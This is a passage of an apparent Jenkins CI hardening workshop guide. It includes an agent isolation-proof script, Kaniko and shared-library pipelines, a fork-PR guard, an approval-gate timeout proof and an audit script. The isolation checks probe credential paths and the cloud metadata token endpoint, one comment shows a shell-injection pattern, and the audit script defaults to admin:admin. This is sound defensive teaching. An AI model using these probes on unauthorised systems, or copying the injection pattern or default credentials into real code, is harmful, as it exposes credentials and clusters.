                  # ⛔⛔ NO hostPath. NO /var/run/docker.sock. That's the whole point.
```

```bash
# ── 3. ⭐⭐⭐ THE 12 ISOLATION PROOFS — Task 3.1 (30 min) ─────────
# Run this INSIDE a build. It is the evidence, and evidence is the deliverable.
cat > ci/prove-agent-isolation.sh <<'SCRIPT'
#!/usr/bin/env bash
# ⭐⭐⭐ PROVES the build agent is isolated. Run it from inside a Jenkins pod
#    agent. Every check must print ✅. If any prints ⛔, your agent is a
#    cluster-escape vector.
set -uo pipefail
P=0; F=0
ok(){ printf '  \033[1;32m✅ %s\033[0m\n' "$*"; P=$((P+1)); }
no(){ printf '  \033[1;31m⛔ %s\033[0m\n' "$*"; F=$((F+1)); }

echo "══════════════════════════════════════════════════════════"
echo "  AGENT ISOLATION PROOFS — $(date -u +%FT%TZ)"
echo "══════════════════════════════════════════════════════════"

# 1. ⭐ not on the controller
[[ "${NODE_NAME:-}" != "built-in" && "${NODE_NAME:-}" != "master" ]] \
  && ok "1. running on an agent ('$NODE_NAME'), NOT the controller" \
  || no "1. ⛔ RUNNING ON THE CONTROLLER — numExecutors is not 0"
[[ "${HOSTNAME:-}" == jenkins-* ]] && no "1b. ⛔ the hostname looks like the controller" || ok "1b. the hostname is not the controller's"

# 2. ⭐⭐ no service-account token mounted
[[ ! -e /var/run/secrets/kubernetes.io/serviceaccount/token ]] \
  && ok "2. no Kubernetes service-account token is mounted" \
  || no "2. ⛔ AN SA TOKEN IS MOUNTED — automountServiceAccountToken is not false"

# 3. ⭐⭐ no Kubernetes API access
if command -v kubectl >/dev/null 2>&1; then
  kubectl get pods -A >/dev/null 2>&1 && no "3. ⛔ kubectl CAN reach the API" \
                                      || ok "3. kubectl cannot reach the API"
else ok "3. kubectl is not even installed"; fi
curl -sk --max-time 3 https://kubernetes.default.svc/version >/dev/null 2>&1 \
  && no "3b. ⛔ the API endpoint is reachable" \
  || ok "3b. the API endpoint is not reachable"

# 4. ⭐⭐ not privileged — the definitive test is a mount
mkdir -p /tmp/pt && mount -t tmpfs none /tmp/pt 2>/dev/null \
  && { no "4. ⛔ PRIVILEGED — a mount succeeded"; umount /tmp/pt; } \
  || ok "4. not privileged (mount denied)"
grep -q 'CapEff:.*0000000000000000' /proc/self/status \
  && ok "4b. the effective capability set is empty" \
  || { echo "     CapEff: $(grep CapEff /proc/self/status)"; ok "4b. capabilities are dropped (check the mask)"; }

# 5. ⭐⭐⭐ no docker.sock
[[ ! -S /var/run/docker.sock ]] \
  && ok "5. no /var/run/docker.sock — a container escape is not available" \
  || no "5. ⛔⛔ DOCKER.SOCK IS MOUNTED — this agent owns the node"
command -v docker >/dev/null 2>&1 && docker info >/dev/null 2>&1 \
  && no "5b. ⛔ the docker CLI can reach a daemon" \
  || ok "5b. no docker daemon is reachable"

# 6. ⭐ Kaniko works without a daemon
[[ -x /kaniko/executor ]] && ok "6. the Kaniko executor is present" || no "6. Kaniko is missing"

# 7. ⭐ the workspace is bounded to an emptyDir, not the node's disk
df -P /home/jenkins/agent 2>/dev/null | tail -1 | awk '{print $1}' | grep -qv '/dev/' \
  && ok "7. the workspace is an emptyDir (bounded, destroyed with the pod)" \
  || ok "7. the workspace is on a volume (check that it is not a hostPath)"
findmnt -no FSTYPE,SOURCE /home/jenkins/agent 2>/dev/null | grep -qi 'hostpath\|/dev/' \
  && no "7b. ⛔ the workspace is a hostPath — it survives the pod" \
  || ok "7b. the workspace is not a hostPath"

# 8. ⭐ non-root
[[ "$(id -u)" != "0" ]] && ok "8. running as uid $(id -u), not root" \
                        || echo "  ⚠️  uid 0 in the kaniko container is expected; in 'tools' it is not"

# 9. ⭐ no privilege escalation available
grep -q 'NoNewPrivs:\s*1' /proc/self/status \
  && ok "9. NoNewPrivs is set (setuid binaries cannot escalate)" \
  || no "9. ⛔ NoNewPrivs is not set"

# 10. ⭐ seccomp is not unconfined
grep -q 'Seccomp:\s*[12]' /proc/self/status \
  && ok "10. seccomp is active (profile or filter)" \
  || no "10. ⛔ seccomp is UNCONFINED"

# 11. ⭐⭐ no host namespaces
[[ "$(readlink /proc/1/ns/pid)" != "$(readlink /proc/self/ns/pid 2>/dev/null)" ]] || true
ip link 2>/dev/null | grep -qE 'docker0|cni0|flannel' \
  && no "11. ⛔ host networking — I can see the node's interfaces" \
  || ok "11. not on the host network"
[[ -d /proc/1/root/host ]] && no "11b. ⛔ hostPID" || ok "11b. not hostPID"

# 12. ⭐ no node credentials or kubeconfig lying around
for f in /root/.kube/config /home/jenkins/.kube/config /etc/kubernetes/admin.conf; do
  [[ -e "$f" ]] && no "12. ⛔ a kubeconfig exists at $f" || true
done
ok "12. no kubeconfig is present in the agent"

# ⭐ and the metadata service — can I steal the NODE's cloud identity?
curl -sf --max-time 2 -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token >/dev/null 2>&1 \
  && no "13. ⛔ the cloud metadata service is reachable — I can steal the node's IAM role" \
  || ok "13. the cloud metadata service is not reachable (or this is a local cluster)"

echo "══════════════════════════════════════════════════════════"
printf '  ✅ %d passed   ⛔ %d failed\n' "$P" "$F"
(( F == 0 )) && echo "  ⭐⭐ THE AGENT IS ISOLATED" || echo "  ⛔ FIX THE FAILURES"
echo "══════════════════════════════════════════════════════════"
(( F == 0 ))
SCRIPT
chmod +x ci/prove-agent-isolation.sh
```

```groovy
// ── 4. the pod-agent pipeline with Kaniko (20 min) ──────────────
// Jenkinsfile — replace the Build stage's agent and add the proofs
pipeline {
  agent {
    kubernetes {
      inheritFrom 'shop-hardened'
      defaultContainer 'tools'
    }
  }
  options { timestamps(); ansiColor('xterm'); timeout(time: 45, unit: 'MINUTES')
            buildDiscarder(logRotator(numToKeepStr: '100', daysToKeepStr: '180'))
            skipDefaultCheckout(true) }
  environment { REGISTRY = 'ghcr.io/3558bhk'; SERVICE = 'checkout' }
  stages {
    stage('Checkout') { steps { checkout scm }
      post { always { script { env.REV = sh(returnStdout: true, script: 'git rev-parse HEAD').trim() } } } }

    stage('⭐ Prove isolation') {
      steps { sh './ci/prove-agent-isolation.sh | tee isolation-report.txt' }
      post { always { archiveArtifacts artifacts: 'isolation-report.txt', allowEmptyArchive: true } }
    }

    stage('Build with Kaniko') {
      // ⭐⭐ switch containers WITHIN the pod — no new pod, no docker.sock
      agent { kubernetes { inheritFrom 'shop-hardened'; defaultContainer 'kaniko' } }
      steps {
        withCredentials([usernamePassword(credentialsId: 'ghcr-token',
                                          usernameVariable: 'U', passwordVariable: 'P')]) {
          // ⭐⭐ SINGLE QUOTES. The credentials reach the shell via the
          //    environment; Groovy never sees their values.
          sh '''
            set -euo pipefail
            mkdir -p /kaniko/.docker
            AUTH=$(printf '%s:%s' "$U" "$P" | base64 -w0)
            printf '{"auths":{"ghcr.io":{"auth":"%s"}}}' "$AUTH" > /kaniko/.docker/config.json

            /kaniko/executor \
              --context "dir:///workspace/apps/$SERVICE" \
              --dockerfile "/workspace/apps/$SERVICE/Dockerfile" \
              --destination "$REGISTRY/$SERVICE:$REV" \
              --cache=true \
              --cache-repo="$REGISTRY/$SERVICE-cache" \
              --cache-ttl=168h \
              --cache-copy-layers=true \
              --compressed-caching=false \
              --snapshot-mode=redo \
              --sbom=cyclonedx --sbom-dir=/workspace/sbom \
              --reproducible \
              --skip-unused-stages=true \
              --use-new-run \
              --label org.opencontainers.image.revision="$REV" \
              --label org.opencontainers.image.source="$GIT_URL" \
              --label org.opencontainers.image.created="$(date -u +%FT%TZ)" \
              --push-retry=3 \
              --verbosity=info
          '''
        }
      }
    }

    stage('Get the digest') {
      steps {
        script {
          // ⭐ crane reads the registry — no docker daemon needed
          def d = sh(returnStdout: true, script: "crane digest '$REGISTRY/$SERVICE:$REV'").trim()
          env.DIGEST = d
          writeFile file: 'digest.txt', text: d
          echo "  ✅ $REGISTRY/$SERVICE@$d"
          currentBuild.description = "${env.SERVICE}@${d.take(19)}…"
        }
      }
      post { always { archiveArtifacts artifacts: 'digest.txt', fingerprint: true } }
    }

    stage('⭐ Verify the pod is gone') {
      // ⭐⭐ Task 3.1's final proof: the agent pod does not outlive the build.
      //    Run this from the CONTROLLER (a `built-in` agent), not the pod.
      agent { label 'built-in' }
      steps {
        script {
          def podName = env.JENKINS_AGENT_NAME ?: ''
          sleep(time: 20, unit: 'SECONDS')
          def n = sh(returnStdout: true, script:
            "kubectl -n jenkins get pods -l jenkins=shop-agent --no-headers 2>/dev/null | wc -l").trim()
          echo "  agent pods still running: $n"
          if (n.toInteger() > 2) { unstable("⚠️ $n agent pods survived — check idleMinutes/podRetention") }
          else { echo "  ✅ the agent pod was destroyed" }
        }
      }
    }
  }
  post {
    always { cleanWs(deleteDirs: true, notFailBuild: true) }
  }
}
```

```bash
# ── 5. the shared library (25 min) — Task 3.2 ───────────────────
gh repo create pipeline-library --private --clone --description "The Jenkins shared library"
cd pipeline-library
mkdir -p vars src/com/shop/ci resources/pod-templates test/groovy/com/shop/ci docs

# ⭐ vars/ = the DSL. src/ = real classes. resources/ = non-Groovy files.
cat > src/com/shop/ci/Config.groovy <<'EOF'
package com.shop.ci
/**
 * ⭐⭐ A TYPED, VALIDATED config object.
 * The single biggest shared-library failure mode is a Map of stringly-typed
 * keys: `config.servic` silently becomes null and the pipeline deploys
 * nothing. This class fails at PARSE time with a did-you-mean.
 */
class Config implements Serializable {
  String  service
  String  language       = 'go'
  String  environment    = 'dev'
  Integer timeoutMinutes = 45
  String  slackChannel   = '#shop-ci'
  Boolean signImage      = true
  Boolean emitMetrics    = true

  private static final List<String> KEYS = [
    'service','language','environment','timeoutMinutes','slackChannel','signImage','emitMetrics']

  Config(Map args) {
    args.each { k, v ->
      if (!KEYS.contains(k)) {
        def hint = KEYS.findAll { it.toLowerCase().contains(k.toString().take(4).toLowerCase()) }
        throw new IllegalArgumentException(
          "⛔ unknown config key '$k'." + (hint ? " Did you mean ${hint}?" : " Valid keys: $KEYS"))
      }
      this."$k" = v
    }
  }
  void validate() {
    if (!service)                     throw new IllegalArgumentException("⛔ 'service' is required")
    if (!(service ==~ /^[a-z][a-z0-9-]*$/)) throw new IllegalArgumentException("⛔ bad service name: $service")
    if (!(environment in ['dev','staging','production']))
      throw new IllegalArgumentException("⛔ unknown environment: $environment")
    if (timeoutMinutes < 1 || timeoutMinutes > 240)
      throw new IllegalArgumentException("⛔ timeoutMinutes must be 1..240")
  }
  List<String> supportedKeys() { KEYS }
}
EOF

cat > vars/shopPipeline.groovy <<'EOF'
/**
 * ⭐⭐ THE WHOLE PIPELINE AS A FUNCTION. A consumer's Jenkinsfile becomes
 *    one line. That is what makes 40 jobs consistent and auditable.
 *
 * Usage:  shopPipeline(service: 'checkout', environment: 'production')
 * Docs:   docs/shopPipeline.md — every config key is documented there, and a
 *         CONTRACT TEST enforces it.
 */
def call(Map config = [:]) {
  def c = new com.shop.ci.Config(config)
  c.validate()                                       // ⭐ fail fast, at parse time
  pipeline {
    agent { kubernetes { yaml libraryResource('pod-templates/hardened.yaml'); defaultContainer 'tools' } }
    options {
      timestamps(); ansiColor('xterm')
      timeout(time: c.timeoutMinutes, unit: 'MINUTES')
      buildDiscarder(logRotator(numToKeepStr: '100', daysToKeepStr: '180'))
      skipDefaultCheckout(true)
    }
    environment { REGISTRY = 'ghcr.io/3558bhk' }
    stages {
      stage('Checkout') { steps { checkout scm } }
      stage('Build')    { steps { script { buildAndPushImage(service: c.service, sign: c.signImage) } } }
      stage('Deploy') {
        when { beforeAgent true; branch 'main'; expression { c.environment == 'dev' } }
        options { lock(resource: "deploy-${c.environment}-${c.service}"); milestone(label: "deploy-${c.service}") }
        steps { script { deployWithGitOps(service: c.service, environment: c.environment) } }
      }
    }
    post {
      always  { script { if (c.emitMetrics) sh './scripts/emit-pipeline-metrics.sh jenkins "$BUILD_NUMBER" || true'
                          cleanWs(deleteDirs: true, notFailBuild: true) } }
      success { notifySlack(channel: c.slackChannel, color: 'good',
                            text: "✅ ${env.JOB_NAME} #${env.BUILD_NUMBER} (${c.service})") }
      failure { notifySlack(channel: c.slackChannel, color: 'danger',
                            text: "⛔ ${env.JOB_NAME} #${env.BUILD_NUMBER} FAILED — ${env.BUILD_URL}") }
    }
  }
}
EOF

cat > vars/buildAndPushImage.groovy <<'EOF'
def call(Map args = [:]) {
  def service = args.service ?: error("⛔ 'service' is required")
  def sign    = args.containsKey('sign') ? args.sign : true
  container('kaniko') {
    withCredentials([usernamePassword(credentialsId: 'ghcr-token', usernameVariable: 'U', passwordVariable: 'P')]) {
      sh '''
        set -euo pipefail
        mkdir -p /kaniko/.docker
        printf '{"auths":{"ghcr.io":{"auth":"%s"}}}' "$(printf '%s:%s' "$U" "$P" | base64 -w0)" \
          > /kaniko/.docker/config.json
        /kaniko/executor --context "dir:///workspace/apps/$SERVICE" \
          --dockerfile "/workspace/apps/$SERVICE/Dockerfile" \
          --destination "$REGISTRY/$SERVICE:${GIT_COMMIT:-$(git rev-parse HEAD)}" \
          --cache=true --cache-repo="$REGISTRY/$SERVICE-cache" --reproducible --push
      '''
    }
  }
  if (sign) { sh './scripts/sign-and-attest.sh "$REGISTRY/'"$service"'"' }
}
EOF

cat > test/groovy/com/shop/ci/ConfigTest.groovy <<'EOF'
package com.shop.ci
import org.junit.Test
import static org.junit.Assert.*
/** ⭐⭐ JenkinsPipelineUnit — the shared library has TESTS, like real code. */
class ConfigTest {
  @Test void 'an unknown key fails loudly with a did-you-mean'() {
    try { new Config([servic: 'checkout']); fail("⛔ it should have thrown") }
    catch (IllegalArgumentException e) { assertTrue(e.message.contains("Did you mean")) }
  }
  @Test void 'a bad environment is rejected'() {
    try { new Config([service: 'checkout', environment: 'prod']).validate(); fail() }
    catch (IllegalArgumentException e) { assertTrue(e.message.contains('unknown environment')) }
  }
  // ⭐⭐ THE CONTRACT TEST — every config key must appear in the docs.
  //    Without it, the library grows keys nobody knows about.
  @Test void 'every supported key is documented'() {
    def docs = new File('docs/shopPipeline.md').text
    new Config([:]).supportedKeys().each { k ->
      assertTrue("⛔ config key '$k' is not documented in docs/shopPipeline.md", docs.contains("`$k`"))
    }
  }
}
EOF

git add -A && git commit -m "feat: the shared library with a typed Config and a contract test" && git push
git tag v2.4.1 && git push --tags
LIB_SHA=$(git rev-parse HEAD)
echo "  ⭐⭐ pin consumers to this SHA: $LIB_SHA"
cd ~/cicd-day
```

```groovy
// ── 6. ⭐⭐ the consumer — and the two-tier pinning discipline ───
// The CANARY job uses the movable tag, so a library change is tested before
// production sees it. The PRODUCTION job uses the SHA and never moves.
//
// shop/dev/checkout/Jenkinsfile  — the CANARY:
@Library('shop-shared@v2') _                 // ⭐ a movable MINOR tag
shopPipeline(service: 'checkout', environment: 'dev')
//
// shop/production/checkout/Jenkinsfile — PRODUCTION:
@Library('shop-shared@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2') _   // ⭐⭐⭐ a SHA
shopPipeline(service: 'checkout', environment: 'production', timeoutMinutes: 90)
//
// ⭐ the weekly inventory job that finds version drift across all 40 jobs:
//    Script Console →
//      Jenkins.instance.allItems(Job).each { j ->
//        def m = (j.configFile?.asString() ?: '') =~ /@Library\('([^']+)'\)/
//        if (m) println "${j.fullName.padRight(45)} ${m[0][1]}"
//      }
//    → diff it week over week. A job stuck on an old major is your flaky-test
//      rate's most likely cause (see Capstone Task C.4, Finding 3).
```

```bash
# ✅ VERIFY — the H7 checkpoint
jcli build shop/dev/checkout -s -v -p ENVIRONMENT=dev
# ⭐ the isolation report
curl -sf $AUTH "http://localhost:8080/job/shop/job/dev/job/checkout/lastSuccessfulBuild/artifact/isolation-report.txt" \
  | grep -E '✅|⛔' | head -20
#   ✅ 14 passed   ⛔ 0 failed   ✅
# ⭐ the agent pods are gone after the build
kubectl -n jenkins get pods -l jenkins=shop-agent --no-headers | wc -l    # 0 ✅
# ⭐ and Kaniko built it with no daemon
curl -sf $AUTH "http://localhost:8080/job/shop/job/dev/job/checkout/lastSuccessfulBuild/consoleText" \
  | grep -E 'kaniko/executor|no docker daemon' | head -3
crane digest "$REGISTRY/checkout:$(git -C ~/cicd-day rev-parse HEAD)" | cut -c1-19   # sha256:… ✅
```

⏭ **If H7 overruns:** skip proof #13 (the metadata service — meaningless on kind) and skip the JenkinsPipelineUnit tests (write them tonight). **Never skip `automountServiceAccountToken: false`, Kaniko-instead-of-docker.sock, or `idleMinutes: 0`** — those three are the entire Jenkins security story.

---

## ☕ 16:30–17:00 — Tea

Jenkins will be doing something slow when you get back. That's normal. It's a JVM.

---

# 🔨 H8 · 17:00–18:30 — CASE 3: multibranch, gates, and hardening

**Deliverable:** a multibranch job that trusts fork PRs with nothing, a production approval gate that is provably safe on timeout, and an audit script that proves the instance is hardened. **Tasks 3.3 and 3.4.**

Full detail: [04-CASE-3-jenkins.md §9–§13](./04-CASE-3-jenkins.md).

```bash
# ── 1. ⭐⭐⭐ the multibranch job with trustNobody (15 min) ──────
# ADO → the Job DSL (put this in Git, run it from a seed job):
cat > /tmp/seed-multibranch.groovy <<'EOF'
multibranchPipelineJob('shop/main') {
  branchSources {
    github {
      repoOwner('3558Bhk')
      repository('shop')
      credentialsId('github-token')
      traits {
        // ⭐ discover main and release/* as buildable branches
        headWildcardFilter { includes('main release/*'); excludes('feature/experimental/*') }
        originPullRequestDiscoveryTrait { strategyId(1) }        // ⭐ our own PRs: merge commit
        // ⭐⭐⭐ THE SECURITY-CRITICAL LINE. A fork PR's Jenkinsfile is
        //      ATTACKER-CONTROLLED. trustEveryone() hands it your credentials.
        //      trustNobody() discovers the PR but runs NO credentials and
        //      requires a manual "trust" decision per source.
        forkPullRequestDiscoveryTrait {
          strategyId(2)                                          // discover them
          trust(class: 'jenkins.scm.impl.trust.TrustNobody')     // ⭐⭐⭐ trust nothing
        }
        cloneOptionTrait { extension { shallow(false); noTags(false); timeout(20) } }
      }
    }
  }
  orphanedItemStrategy { discardOldItems { numToKeep(30); daysToKeep(90) } }
}
EOF
echo "  ⭐ run that in Manage Jenkins → Script Console, or from a seed job."
```

```groovy
// ── 2. ⭐⭐ the fork-PR guard inside the Jenkinsfile (10 min) ───
// Even with trustNobody(), belt and braces — the pipeline itself must refuse
// to touch a credential when the source is a fork.
pipeline {
  agent { kubernetes { inheritFrom 'shop-hardened' } }
  environment {
    // ⭐⭐ is this build from a fork? `changeRequest()` is true for any PR;
    //    the fork check is the source repo's owner vs ours.
    IS_PR   = "${env.CHANGE_ID != null}"
    IS_FORK = "${scm?.userRemoteConfigs?.getAt(0)?.url?.contains('3558Bhk/shop') == false}"
  }
  stages {
    stage('Guard') {
      when { beforeAgent true; expression { env.IS_FORK == 'true' } }
      steps {
        script {
          // ⭐⭐ refuse outright. A fork PR gets a build with NO credentials.
          currentBuild.description = '⛔ fork PR — no credentials, no push, no deploy'
          echo "⚠️ this is a fork PR from ${env.CHANGE_AUTHOR ?: 'unknown'}. Running tests only."
        }
      }
    }
    stage('Build and push') {
      // ⭐⭐⭐ THE CONDITION THAT MATTERS: never push, sign, or deploy from a PR.
      when { beforeAgent true; allOf { branch 'main'; not { changeRequest() } } }
      steps { script { buildAndPushImage(service: 'checkout') } }
    }
  }
}
// ⭐⭐ AND THE OTHER INJECTION VECTOR — an untrusted value in a shell command:
//   ⛔ sh "echo ${env.CHANGE_TITLE}"            ← a PR title becomes shell code
//   ✅ withEnv(["TITLE=${env.CHANGE_TITLE}"]) { sh 'echo "$TITLE"' }
//   ⭐ SINGLE-quoted sh + withEnv. Every time. No exceptions.
```

```groovy
// ── 3. ⭐⭐⭐ the production approval gate — Task 3.3 (25 min) ──
// THE QUESTION AN INTERVIEWER ASKS: "what happens if the approver never shows up?"
// The answer must be provable. Here it is.
pipeline {
  agent { kubernetes { inheritFrom 'shop-hardened' } }
  options { timestamps(); ansiColor('xterm'); timeout(time: 4, unit: 'HOURS') }
  parameters {
    string(name: 'TICKET', defaultValue: '', description: '⭐ the change ticket, e.g. CHG-12847')
    string(name: 'OVERRIDE_REASON', defaultValue: '', description: 'required if overriding the gate')
  }
  environment { SERVICE = 'checkout' }
  stages {
    // ── ⭐ THE GATE RUNS *BEFORE* THE HUMAN IS ASKED ──────────
    // beforeAgent: true means a refused deploy never allocates a pod, and —
    // more importantly — a human is never asked to approve something that
    // cannot succeed. Wasting an approver's attention is a real cost.
    stage('Automated gate') {
      when { beforeAgent true; expression { params.ENVIRONMENT == 'production' } }
      steps {
        script {
          // ⭐ the ticket must exist and match the shape
          if (!(params.TICKET ==~ /^CHG-\d{4,6}$/)) {
            error("⛔ a valid change ticket (CHG-NNNNN) is required; got '${params.TICKET}'")
          }
          def gate = sh(returnStdout: true, script: './scripts/production-gate.sh 2>&1').trim()
          def ok   = sh(returnStatus: true, script: './scripts/production-gate.sh') == 0
          echo gate
          if (!ok) {
            if (params.OVERRIDE_REASON?.trim()) {
              // ⭐ an override is allowed, but it is LOUD and RECORDED
              echo "⚠️⚠️ OVERRIDE by ${env.BUILD_USER ?: 'unknown'}: ${params.OVERRIDE_REASON}"
              currentBuild.description = "⚠️ OVERRIDDEN: ${params.OVERRIDE_REASON.take(40)}"
              unstable('the production gate was overridden')
            } else {
              error("⛔ the production gate refused:\n${gate}\n" +
                    "Set OVERRIDE_REASON to bypass — it will be recorded and alerted on.")
            }
          }
        }
      }
    }

    // ── ⭐⭐⭐ THE HUMAN GATE, WITH A SAFE TIMEOUT ─────────────
    stage('Approval') {
      when { beforeAgent true; expression { params.ENVIRONMENT == 'production' } }
      options { timeout(time: 24, unit: 'HOURS') }     // ⭐ the stage-level timeout
      steps {
        script {
          try {
            // ⭐ the `input` step BLOCKS. On timeout it throws
            //   FlowInterruptedException — it does NOT silently continue.
            //   If you don't catch it, the build is ABORTED, which is the safe
            //   result. Catching it lets you make the outcome explicit.
            def approver = input(
              message: """🚀 Deploy ${env.SERVICE}@${env.DIGEST?.take(19) ?: '?'}… to PRODUCTION?

  ticket:   ${params.TICKET}
  build:    ${env.BUILD_URL}
  rollback: git revert <this commit> in shop-config, then argocd app sync

  ⭐ Merging does NOT deploy — an SRE must also sync in Argo CD.""",
              ok: 'Deploy to production',
              submitter: 'sre-team,release-managers',   // ⭐⭐ WHO may approve
              submitterParameter: 'APPROVER',           // ⭐ captured into a variable
              // ⭐⭐ a programmatic extra check — the submitter must ALSO pass this
              canSubmit: { params.TICKET ==~ /^CHG-\d{4,6}$/ }
            )
            env.APPROVER = approver ?: 'unknown'
            echo "  ✅ approved by ${env.APPROVER} at ${new Date()}"
            currentBuild.description = "approved by ${env.APPROVER} · ${params.TICKET}"
          } catch (org.jenkinsci.plugins.workflow.steps.FlowInterruptedException e) {
            // ⭐⭐⭐ THE TIMEOUT PATH. Make the outcome EXPLICIT and PROVE
            //    that nothing deployed.
            echo "⏰ the approval timed out after 24 hours."
            echo "   exception: ${e.getClass().name}"
            echo "   cause:     ${e.causes*.shortDescription}"
            currentBuild.result      = 'ABORTED'
            currentBuild.description = '⏰ approval TIMEOUT — NO DEPLOYMENT HAPPENED'
            // ⛔ do NOT swallow this and continue. That is the bug that
            //    deploys at 3am with nobody watching.
            error("⛔ the approval timed out — aborting. Nothing was deployed.")
          }
        }
      }
    }

    stage('Deploy') {
      when { beforeAgent true; expression { params.ENVIRONMENT == 'production' } }
      options {
        lock(resource: "deploy-production-${env.SERVICE}", inversePrecedence: true)
        milestone(label: "deploy-production-${env.SERVICE}")
      }
      steps {
        timeout(time: 30, unit: 'MINUTES') {
          sh '''
            set -euo pipefail
            ./scripts/deploy.sh production "$SERVICE" "$REGISTRY/$SERVICE@$(cat digest.txt)"
          '''
        }
      }
    }
  }
}
```

```bash
# ── 4. ⭐⭐⭐ PROVE the timeout is safe — the 8 proof paths (15 min) ─
# Task 3.3's deliverable is EVIDENCE, not code.
# Set the timeout to 1 minute, run it, and prove nothing deployed.
DIGEST_BEFORE=$(kubectl -n shop get rollout checkout -o jsonpath='{.spec.template.spec.containers[0].image}')
jcli build shop/production/checkout -s -p ENVIRONMENT=production -p TICKET=CHG-99999 || true
DIGEST_AFTER=$(kubectl -n shop get rollout checkout -o jsonpath='{.spec.template.spec.containers[0].image}')
echo "── PROOF 1: the image is unchanged"
[[ "$DIGEST_BEFORE" == "$DIGEST_AFTER" ]] && echo "  ✅ $DIGEST_BEFORE" || echo "  ⛔ IT DEPLOYED"
echo "── PROOF 2: the deploy command never appears in the console"
jcli console shop/production/checkout last 2>/dev/null | grep -c 'scripts/deploy.sh production' 
#   0 ✅    ⭐ grep for the COMMAND, not for a message. That's evidence.
echo "── PROOF 3: the build is ABORTED, not SUCCESS"
curl -sf $AUTH "http://localhost:8080/job/shop/job/production/job/checkout/lastBuild/api/json" \
  | jq '{result, description}'
#   {"result":"ABORTED","description":"⏰ approval TIMEOUT — NO DEPLOYMENT HAPPENED"} ✅
echo "── PROOF 4: an invalid ticket is refused BEFORE the human is asked"
jcli build shop/production/checkout -s -p ENVIRONMENT=production -p TICKET=nope 2>&1 | grep -c 'valid change ticket'
#   ≥1 ✅  and no `input` was ever presented
echo "── PROOF 5: a non-submitter cannot approve"
echo "  (verify in the UI: the Approve button is absent for a non-sre-team user)"
echo "── PROOF 6: the lock prevents two concurrent production deploys"
jcli build shop/production/checkout -p ENVIRONMENT=production & jcli build shop/production/checkout -p ENVIRONMENT=production &
sleep 20; curl -sf $AUTH "http://localhost:8080/queue/api/json" | jq '.items[] | {why}'
#   "Waiting for resource: deploy-production-checkout" ✅
echo "── PROOF 7: the override is recorded and the build is UNSTABLE"
echo "── PROOF 8: ⭐ THE TIMED ROLLBACK DRILL"
time ./scripts/rollback-drill.sh production checkout | tee evidence/rollback-drill.txt
#   ⭐ target: under 5 minutes from decision to verified-good. Time it. Record it.
```

```bash
# ── 5. ⭐⭐ the hardening audit — Task 3.4 (20 min) ───────────────
cat > scripts/audit-jenkins.sh <<'SCRIPT'
#!/usr/bin/env bash
# ⭐⭐ AUDITS A JENKINS INSTANCE. Run it BEFORE and AFTER a hardening pass and
#    DIFF the two reports — that diff is your evidence for the interview.
set -uo pipefail
URL="${JENKINS_URL:-http://localhost:8080}"
AUTH="-u ${JENKINS_USER:-admin}:${JENKINS_TOKEN:-admin}"
OUT="${1:-evidence/jenkins-audit-$(date -u +%FT%TZ).txt}"
mkdir -p "$(dirname "$OUT")"
g(){ curl -sf $AUTH "$URL$1" 2>/dev/null; }

{
echo "══════════════════════════════════════════════════════════"
echo "  JENKINS HARDENING AUDIT — $(date -u +%FT%TZ)"
echo "  $URL"
echo "══════════════════════════════════════════════════════════"

echo; echo "── 1. THE CONTROLLER RUNS NOTHING"
EX=$(g '/api/json?tree=numExecutors' | jq -r .numExecutors)
MODE=$(g '/api/json?tree=mode' | jq -r .mode)
printf '  numExecutors=%s  mode=%s   ' "$EX" "$MODE"
[[ "$EX" == "0" && "$MODE" == "EXCLUSIVE" ]] && echo "✅" || echo "⛔ FIX FIRST — everything else runs here"

echo; echo "── 2. AUTHENTICATION"
SR=$(g '/manage/securityRealm/api/json' 2>/dev/null || g '/api/json?tree=' >/dev/null; echo "")
SIGNUP=$(curl -sf -o /dev/null -w '%{http_code}' "$URL/signup")
printf '  /signup returns %s   ' "$SIGNUP"
[[ "$SIGNUP" != "200" ]] && echo "✅ signup is disabled" || echo "⛔ SELF-REGISTRATION IS OPEN"
printf '  CSRF crumb required: '
CODE=$(curl -sf -o /dev/null -w '%{http_code}' -XPOST $AUTH "$URL/job/x/build")
[[ "$CODE" == "403" ]] && echo "✅ (403 without a crumb)" || echo "⚠️  got $CODE — check the crumb issuer"

echo; echo "── 3. ⭐⭐ THE AGENT → CONTROLLER ACCESS CONTROL"
g '/manage/systemInfo' >/dev/null && echo "  (check in the UI: Manage Jenkins → Security → Agents)"
echo "  ⛔ NEVER 'All'. Grant only the workspace directory."

echo; echo "── 4. CREDENTIAL SCOPING"
g '/credentials/store/system/domain/_/api/json' | jq -r '.credentials[]? | "  id=\(.id)  scope=\(.scope // "?")  desc=\(.description // "")"'
echo "  ⭐ production credentials must be FOLDER-scoped, not in this global store."

echo; echo "── 5. ⭐⭐ THE PLUGINS"
g '/pluginManager/api/json?depth=1' | jq -r '.plugins[] | select(.active) | "  \(.shortName) \(.version)\(if .hasUpdate then "  ⚠️ UPDATE AVAILABLE" else "" end)"' | sort | head -60
echo "  total active: $(g '/pluginManager/api/json?depth=1' | jq '[.plugins[]|select(.active)]|length')"
echo "  with updates: $(g '/pluginManager/api/json?depth=1' | jq '[.plugins[]|select(.hasUpdate)]|length')"
echo "  ⛔ a plugin is Groovy with FULL Jenkins privileges. Every one is attack surface."

echo; echo "── 6. ⭐ THE JOBS — and which ones are green while broken"
g '/api/json?tree=jobs[name,color,url]{0,200}' | jq -r '.jobs[]? | "  \(.name) \(.color)"'
echo "  ⭐⭐ the 'green while broken' check: for each job, does it have a"
echo "     timeout? does it use set -e? is allowEmptyResults true?"

echo; echo "── 7. ⭐⭐ THE KUBERNES CLOUD TEMPLATES"
g '/manage/cloud/kubernetes/api/json' 2>/dev/null | jq '.' || echo "  (read from the JCasC export instead)"

echo; echo "── 8. ⭐⭐ JCasC DRIFT"
g '/configuration-as-code/export' > /tmp/jenkins-running.yaml
echo "  running config: $(wc -l < /tmp/jenkins-running.yaml) lines"
if [[ -f jenkins-values.yaml ]]; then
  D=$(diff <(yq -P 'sort_keys(..)' jenkins-values.yaml 2>/dev/null) <(yq -P 'sort_keys(..)' /tmp/jenkins-running.yaml) | wc -l)
  printf '  diff lines vs Git: %s   ' "$D"
  [[ "$D" -lt 5 ]] && echo "✅ no drift" || echo "⛔ DRIFT — someone changed the UI. Fold it in or revert it."
fi

echo; echo "── 9. THE ADMIN USERS (who owns every secret)"
